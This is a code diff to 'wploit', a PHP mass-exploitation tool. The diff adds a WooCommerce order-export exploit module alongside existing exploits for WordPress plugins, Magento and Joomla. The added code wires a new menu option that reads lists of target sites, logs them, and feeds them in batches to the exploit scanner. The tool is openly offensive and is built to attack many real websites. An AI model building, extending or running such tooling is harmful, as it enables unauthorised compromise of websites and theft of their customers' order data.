@@ -13,13 +13,15 @@ require_once("Exploit/plugins-gravityforms.php");
 require_once("Exploit/wp-content-injection.php");
 require_once("Exploit/magento-exploit.php");
 require_once("Exploit/joomla_jLike.php");
+require_once("Exploit/woocommerce-exploit.php");
 
 /**
  * @Author: Eka Syahwan
  * @Date:   2017-12-11 17:01:26
- * @Last Modified by:   shor7cut
- * @Last Modified time: 2018-09-16 13:53:04
+ * @Last Modified by:   Eka Syahwan
+ * @Last Modified time: 2018-10-01 04:07:27
 */
+
 class wploit
 {
 	function __construct()
@@ -36,6 +38,7 @@ class wploit
 		$this->Exploit_wp_content_injection 	= new Exploit_wp_content_injection;
 		$this->Exploit_Magento 					= new Exploit_Magento;
 		$this->Exploit_jLike 					= new Exploit_jLike;
+		$this->Exploit_Plugins_woocommerce 		= new Exploit_Plugins_woocommerce;
 
 	  	echo $this->wploit_modules->color("green","\n========================================================\r\n\n");
         echo $this->wploit_modules->color("green","┌─┐┬  ┬┌─┐┌─┐┌─┐┌┐┌┌┐┌┌─┐┬─┐ Version : 1.3\r\n");
@@ -91,6 +94,9 @@ class wploit
 					break;
 					case 'content_injection':
 						$this->exploit_content_injection();
+					break;
+					case 'w_o_e':
+						$this->exploit_w_o_e();
 					break;
 					default:
 						die('!error!');
@@ -226,6 +232,24 @@ class wploit
 			}
 			fclose($fopn);
 			$this->ExploitDefaultAdmin->scanner($config_url); unset($config_url);
+			sleep($dataConfig['delay']);
+		}
+	}
+	function exploit_w_o_e(){
+		$dataConfig = $this->wploit_modules->required();
+		$xselc  	= $this->wploit_modules->stuck("Total Request : ".(count($dataConfig['list'])*$dataConfig['threads'])." , Keep going ? [0 = NO , 1 = YES] : ");echo "\r\n";
+		if($xselc == 0){
+			die('!error!');
+		}
+		foreach ($dataConfig['list'] as $keys => $dataurl) {
+			$fopn = fopen("log/log-woocommerce-order-export-".$dataConfig['namafile'].".txt", "w");
+			foreach ($dataurl as $ukey => $url) {
+				$logScan 	  = ($logScan+1);
+				$config_url[] =  array('url' => $this->filter_domain($url));
+				fwrite($fopn, $ukey."|".$url."\r\n");
+			}
+			fclose($fopn);
+			$this->Exploit_Plugins_woocommerce->scanner($config_url , "Line : ".$logScan." of ".ceil((count($dataConfig['list'])*$dataConfig['threads'])) ); unset($config_url);
 			sleep($dataConfig['delay']);
 		}
 	}
